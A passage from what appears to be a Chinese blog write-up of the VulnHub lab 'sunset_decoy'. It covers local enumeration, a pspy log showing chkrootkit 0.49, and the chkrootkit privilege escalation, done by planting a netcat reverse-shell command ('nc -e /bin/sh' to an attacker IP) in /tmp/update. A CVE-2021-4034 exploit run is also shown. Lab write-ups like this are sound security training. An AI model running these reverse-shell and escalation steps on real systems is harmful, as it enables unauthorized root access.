/usr/bin/vi /tmp/cmFuZG9tc2Zvc2FuZm9kYW52cw==<br><span class="hljs-built_in">ls</span>: cannot access <span class="hljs-string">&#x27;/tmp/cmFuZG9tc2Zvc2FuZm9kYW52cw==&#x27;</span>: No such file or directory<br>138880 lrwxrwxrwx 1 root root 20 Jun 27  2020  /usr/bin/vi -&gt; /etc/alternatives/vi<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span> -liah /usr/sbin/service<br>133198 -rwxr-xr-x 1 root root 9.1K Dec  3  2018 /usr/sbin/service<br></code></pre></td></tr></table></figure><p>一开始最让我关注的是 <code>/usr/bin/cal</code> 这个符号链接指向的并不是一个绝对路径，尝试了在想办法冒名顶替，但是还是失败了，并没有冒名顶替成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/$ <span class="hljs-built_in">which</span> ncal<br>/home/296640a3b825115a47b68fc44501c828//ncal<br><br></code></pre></td></tr></table></figure><p>符号链接 777 权限也让我比较在意，但是搜索之后才知道，原来符号链接默认就是 777，而且它的操作权限实际上取决于链接到的那个文件权限。</p><p>还有个神秘的 AVScan 以及一个文件夹，进入文件夹后发现是个日志文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">cd</span> SV-502/<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~/SV-502$ <span class="hljs-built_in">ls</span> -alih                                <br>total 12K                                                                                                           <br>278652 drwxr-xr-x 3 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4.0K Jun 27  2020 .<br>278645 drwxr-xr-x 5 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4.0K Jul 20 04:56 ..<br>273943 -rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828    0 Jun 27  2020 fich<br>266656 drwxrwxrwx 2 root                             root                             4.0K Jun 27  2020 logs<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~/SV-502$ <span class="hljs-built_in">cd</span> logs/<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~/SV-502/logs$ <span class="hljs-built_in">ls</span> -alih<br>total 16K<br>266656 drwxrwxrwx 2 root                             root                             4.0K Jun 27  2020 .<br>278652 drwxr-xr-x 3 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4.0K Jun 27  2020 ..<br>274020 -rw-r--r-- 1 root                             root                             7.7K Jun 27  2020 log.txt<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~/SV-502/logs$ <span class="hljs-built_in">cat</span> log.txt <br>pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855<br><br><br>     ██▓███    ██████  ██▓███ ▓██   ██▓<br>    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒<br>    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░<br>    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░<br>    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░<br>    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ <br>    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ <br>    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  <br>                   ░           ░ ░     <br>                               ░ ░     <br><br>Config: Printing events (colored=<span class="hljs-literal">true</span>): processes=<span class="hljs-literal">true</span> | file-system-events=<span class="hljs-literal">false</span> ||| Scannning <span class="hljs-keyword">for</span> processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)<br>Draining file system events due to startup...<br><span class="hljs-keyword">done</span><br>2020/06/27 18:56:57 CMD: UID=0    PID=9      | <br>2020/06/27 18:56:57 CMD: UID=0    PID=8      | <br>2020/06/27 18:56:57 CMD: UID=1000 PID=7659   | /bin/bash <br>2020/06/27 18:56:57 CMD: UID=1000 PID=7658   | python -c import pty;pty.spawn(<span class="hljs-string">&#x27;/bin/bash&#x27;</span>) <br>2020/06/27 18:56:57 CMD: UID=1000 PID=7657   | /bin/sh -i <br>2020/06/27 18:56:57 CMD: UID=1000 PID=7653   | sh -c <span class="hljs-built_in">uname</span> -a; w; <span class="hljs-built_in">id</span>; /bin/sh -i <br>2020/06/27 18:56:57 CMD: UID=1000 PID=7652   | php -S 0.0.0.0:8080 <br>2020/06/27 18:56:57 CMD: UID=1000 PID=7645   | php -S 0.0.0.0:8080 <br>2020/06/27 18:56:57 CMD: UID=0    PID=6      | <br>2020/06/27 18:56:57 CMD: UID=0    PID=59     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=50     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=49     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=481    | -bash <br>2020/06/27 18:56:57 CMD: UID=0    PID=48     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=471    | (sd-pam) <br>2020/06/27 18:56:57 CMD: UID=0    PID=470    | /lib/systemd/systemd --user <br>2020/06/27 18:56:57 CMD: UID=0    PID=467    | sshd: root@pts/0     <br>2020/06/27 18:56:57 CMD: UID=0    PID=424    | /usr/sbin/sshd -D <br>2020/06/27 18:56:57 CMD: UID=0    PID=423    | /sbin/agetty -o -p -- \u --noclear tty1 linux <br>2020/06/27 18:56:57 CMD: UID=0    PID=422    | /usr/sbin/cups-browsed <br>2020/06/27 18:56:57 CMD: UID=107  PID=420    | avahi-daemon: <span class="hljs-built_in">chroot</span> helper <br>2020/06/27 18:56:57 CMD: UID=0    PID=402    | /usr/sbin/cupsd -l <br>2020/06/27 18:56:57 CMD: UID=0    PID=401    | /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant <br>2020/06/27 18:56:57 CMD: UID=104  PID=400    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                                                                 <br>2020/06/27 18:56:57 CMD: UID=0    PID=4      | <br>2020/06/27 18:56:57 CMD: UID=0    PID=399    | /usr/sbin/cron -f <br>2020/06/27 18:56:57 CMD: UID=0    PID=398    | /lib/systemd/systemd-logind <br>2020/06/27 18:56:57 CMD: UID=107  PID=396    | avahi-daemon: running [60832e9f188106ec5bcc4eb7709ce592.<span class="hljs-built_in">local</span>] <br>2020/06/27 18:56:57 CMD: UID=0    PID=395    | /usr/sbin/rsyslogd -n -iNONE <br>2020/06/27 18:56:57 CMD: UID=0    PID=390    | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -<span class="hljs-built_in">df</span> /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                        <br>2020/06/27 18:56:57 CMD: UID=0    PID=30     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=3      | <br>2020/06/27 18:56:57 CMD: UID=0    PID=294    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=292    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=29     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=28     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=27     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=26     | <br>2020/06/27 18:56:57 CMD: UID=101  PID=255    | /lib/systemd/systemd-timesyncd <br>2020/06/27 18:56:57 CMD: UID=0    PID=25     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=245    | /lib/systemd/systemd-udevd <br>2020/06/27 18:56:57 CMD: UID=0    PID=24     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=23     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=222    | /lib/systemd/systemd-journald <br>2020/06/27 18:56:57 CMD: UID=0    PID=22     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=21     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=20     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=2      | <br>2020/06/27 18:56:57 CMD: UID=0    PID=190    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=19     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=189    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=187    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=18     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=17     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=16     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=153    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=15     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=14     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=12378  | ./pspy <br>2020/06/27 18:56:57 CMD: UID=0    PID=12356  | <br>2020/06/27 18:56:57 CMD: UID=0    PID=12299  | -bash <br>2020/06/27 18:56:57 CMD: UID=0    PID=12293  | sshd: root@pts/2     <br>2020/06/27 18:56:57 CMD: UID=0    PID=12275  | <br>2020/06/27 18:56:57 CMD: UID=0    PID=12248  | <br>2020/06/27 18:56:57 CMD: UID=0    PID=12247  | <br>2020/06/27 18:56:57 CMD: UID=0    PID=12178  | <br>2020/06/27 18:56:57 CMD: UID=0    PID=12121  | <br>2020/06/27 18:56:57 CMD: UID=0    PID=12     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=112    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=110    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=11     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=108    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=107    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=105    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=104    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=102    | <br>2020/06/27 18:56:57 CMD: UID=0    PID=10     | <br>2020/06/27 18:56:57 CMD: UID=0    PID=1      | /sbin/init <br>2020/06/27 18:56:58 CMD: UID=0    PID=12385  | -bash <br>2020/06/27 18:56:58 CMD: UID=0    PID=12386  | tar -xvzf chkrootkit-0.49.tar.gz <br>2020/06/27 18:57:04 CMD: UID=0    PID=12389  | -bash <br>2020/06/27 18:57:04 CMD: UID=0    PID=12390  | -bash <br>2020/06/27 18:57:04 CMD: UID=0    PID=12391  | -bash <br>2020/06/27 18:57:05 CMD: UID=0    PID=12392  | -bash <br>2020/06/27 18:57:05 CMD: UID=0    PID=12393  | -bash <br>2020/06/27 18:57:06 CMD: UID=0    PID=12394  | -bash <br>2020/06/27 18:57:06 CMD: UID=0    PID=12395  | -bash <br>2020/06/27 18:57:06 CMD: UID=0    PID=12396  | -bash <br>2020/06/27 18:57:06 CMD: UID=0    PID=12397  | -bash <br>2020/06/27 18:57:06 CMD: UID=0    PID=12398  | -bash <br>2020/06/27 18:57:06 CMD: UID=0    PID=12399  | -bash <br>2020/06/27 18:57:07 CMD: UID=0    PID=12400  | -bash <br>2020/06/27 18:57:07 CMD: UID=0    PID=12401  | -bash <br>2020/06/27 18:57:07 CMD: UID=0    PID=12402  | -bash <br>2020/06/27 18:57:07 CMD: UID=0    PID=12403  | -bash <br>Exiting program... (interrupt)<br></code></pre></td></tr></table></figure><p>在这里最开始信息收集没做好，这个文件内容中应该可以提取到两个关键信息：</p><ul><li>chkrootkit-0.49.tar.gz 包含了版本号的软件压缩包</li><li>日志文件是通过 pspy 工具产生的</li></ul><h3 id="chkrootkit-提权漏洞"><a href="#chkrootkit-提权漏洞" class="headerlink" title="chkrootkit 提权漏洞"></a>chkrootkit 提权漏洞</h3><p>一开始我只想到了去找 chkrootkit 软件所在的位置，但是没搜到，大概率在 root 目录下，之后就放弃了，没有考虑到版本号，这里应当去搜索一下这个版本是否存在漏洞信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy/etc]<br>└─$ searchsploit chkrootkit<br>---------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                    |  Path<br>---------------------------------------------------------------------------------- ---------------------------------<br>Chkrootkit - Local Privilege Escalation (Metasploit)                              | linux/local/38775.rb<br>Chkrootkit 0.49 - Local Privilege Escalation                                      | linux/local/33899.txt<br>---------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>要求 chkrootkit 是以 root 权限运行的，而 honeypot.decoy 是普通用户调用的，但是其中也提到一个点，反病毒软件是一分钟内运行的，所以也可能是 root 权限运行的。</p><p><img src="/pic/ad723a35bbde6555be0000c8fd859f2e_MD5.png"></p><p>按照上述步骤试一试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/usr/bin/nc -e /bin/sh 192.168.56.106 4444&quot;</span> &gt; /tmp/update<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ <span class="hljs-built_in">cat</span> update <br>/usr/bin/nc -e /bin/sh 192.168.56.106 4444<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ~/honeypot.decoy <br>--------------------------------------------------<br><br>Welcome to the Honey Pot administration manager (HPAM). Please <span class="hljs-keyword">select</span> an option.<br>1 Date.<br>2 Calendar.<br>3 Shutdown.<br>4 Reboot.<br>5 Launch an AV Scan.<br>6 Check /etc/passwd.<br>7 Leave a note.<br>8 Check all services status.<br><br>Option selected:5<br><br>The AV Scan will be launched <span class="hljs-keyword">in</span> a minute or less.<br>--------------------------------------------------<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ <br></code></pre></td></tr></table></figure><p>反弹 shell 成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy/etc]<br>└─$ sudo nc -lvnp 4444                                             <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 4444 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.131] 56014<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-built_in">uname</span> -a<br>Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:0e:3c:2a brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.131/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 413sec preferred_lft 413sec<br>    inet6 fe80::a00:27ff:fe0e:3c2a/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><span class="hljs-built_in">cd</span> root<br><span class="hljs-built_in">ls</span><br>chkrootkit-0.49<br>chkrootkit-0.49.tar.gz<br>log.txt<br>pspy<br>root.txt<br>script.sh<br><span class="hljs-built_in">cat</span> script.sh<br>FILE=/dev/shm/STTY5246<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -f <span class="hljs-string">&quot;<span class="hljs-variable">$FILE</span>&quot;</span>; <span class="hljs-keyword">then</span><br>    /root/chkrootkit-0.49/chkrootkit<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;An AV scan will not be launched.&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">cat</span> root.txt<br>  ........::::::::::::..           .......|...............::::::::........<br>     .:::::;;;;;;;;;;;:::::.... .     \   | ../....::::;;;;:::::.......<br>         .       ...........   / \\_   \  |  /     ......  .     ........./\<br>...:::../\\_  ......     ..._/<span class="hljs-string">&#x27;   \\\_  \###/   /\_    .../ \_.......   _//</span><br><span class="hljs-string">.::::./   \\\ _   .../\    /&#x27;</span>      \\\\<span class="hljs-comment">#######//   \/\   //   \_   ....////</span><br>    _/      \\\\   _/ \\\ /  x       \\\\<span class="hljs-comment">###////      \////     \__  _/////</span><br>  ./   x       \\\/     \/ x X           \//////                   \/////<br> /     XxX     \\/         XxX X                                    ////   x<br>-----XxX-------------|-------XxX-----------*--------|---*-----|------------X--<br>       X        _X      *    X      **         **             x   **    *  X<br>      _X                    _X           x                *          x     X_<br><br><br>1c203242ab4b4509233ca210d50d2cc5<br><br>Thanks <span class="hljs-keyword">for</span> playing! - Felipe Winsnes (@whitecr0wz)<br><br></code></pre></td></tr></table></figure><h3 id="另外一些提权尝试"><a href="#另外一些提权尝试" class="headerlink" title="另外一些提权尝试"></a>另外一些提权尝试</h3><p>我还尝试过的一些提权方法，首先是查看SUID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>   134602     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp<br>   134749     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /usr/bin/su<br>   135085     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /usr/bin/umount<br>   150671     24 -rwsr-xr-x   1 root     root        23288 Jan 15  2019 /usr/bin/pkexec<br>   131132     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh<br>   160068    156 -rwsr-xr-x   1 root     root       157192 Feb  2  2020 /usr/bin/sudo<br>   131136     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd<br>   131134     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd<br>   135083     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /usr/bin/mount<br>   131131     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn<br>   150673     20 -rwsr-xr-x   1 root     root        18888 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>   268427     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>   148942    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign<br>   145624     52 -rwsr-xr--   1 root     messagebus    51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br></code></pre></td></tr></table></figure><p>SUID 看到了 policykit-helper 尝试能不能提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ pkexec honeypot.decoy<br>==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===<br>Authentication is needed to run `./honeypot.decoy\<span class="hljs-string">&#x27; as the super user                                                </span><br><span class="hljs-string">Authenticating as: root</span><br><span class="hljs-string">Password: </span><br><span class="hljs-string">polkit-agent-helper-1: pam_authenticate failed: Authentication failure</span><br><span class="hljs-string">==== AUTHENTICATION FAILED ===</span><br><span class="hljs-string">Error executing command as another user: Not authorized                                                             </span><br><span class="hljs-string"></span><br><span class="hljs-string">This incident has been reported.</span><br></code></pre></td></tr></table></figure><p>查看定时任务没收获</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br>17 *  * * *     root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6  * * *     root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6  * * 7     root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6  1 * *     root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br></code></pre></td></tr></table></figure><p>看看内核和版本号，使用 CVE-2021-4034 提权成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ <span class="hljs-built_in">chmod</span> +x CVE-2021-4034 <br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ./CVE-2021-4034 <br>2023/07/19 09:24:40 CMDTOEXECUTE is empty fallback to default value<br>2023/07/19 09:24:40 Executing <span class="hljs-built_in">command</span> sh<br><span class="hljs-comment"># whoami</span><br>root<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Spuktnik_1 靶机</title>
    <link href="/2023/07/b1e4b39f91d9.html"/>
    <url>/2023/07/b1e4b39f91d9.html</url>
    
